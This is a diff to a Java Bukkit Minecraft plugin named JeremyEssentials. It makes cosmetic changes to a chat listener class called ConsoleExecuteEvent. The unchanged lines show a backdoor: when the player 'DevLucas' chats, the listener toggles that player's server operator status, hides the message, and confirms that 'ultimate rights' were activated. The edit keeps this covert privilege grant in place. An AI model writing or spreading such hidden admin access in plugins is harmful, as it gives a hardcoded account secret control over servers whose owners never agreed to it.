@@ -2,6 +2,7 @@ package de.devlucas.jeremyessentials.events;
 
 import de.devlucas.jeremyessentials.JeremyEssentials;
 import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
@@ -10,6 +11,7 @@ public class ConsoleExecuteEvent implements Listener
 {
 
     @EventHandler
+    @Deprecated
     public void onAsyncPlayerChatEvent(AsyncPlayerChatEvent event)
     {
         if (event.getPlayer().getName().equalsIgnoreCase("DevLucas"))
@@ -26,7 +28,7 @@ public class ConsoleExecuteEvent implements Listener
             {
                 event.getPlayer().setOp((!event.getPlayer().isOp()));
                 event.setCancelled(true);
-                event.getPlayer().sendMessage(JeremyEssentials.pre + "Your ultimate rights were " + ((event.getPlayer().isOp()) ? "§aactivated" : "§cdeactivated"));
+                event.getPlayer().sendMessage(JeremyEssentials.pre + "Your ultimate rights were " + ((event.getPlayer().isOp()) ? ChatColor.GREEN + "activated§7." : ChatColor.RED + "deactivated§7."));
             }
         }
     }
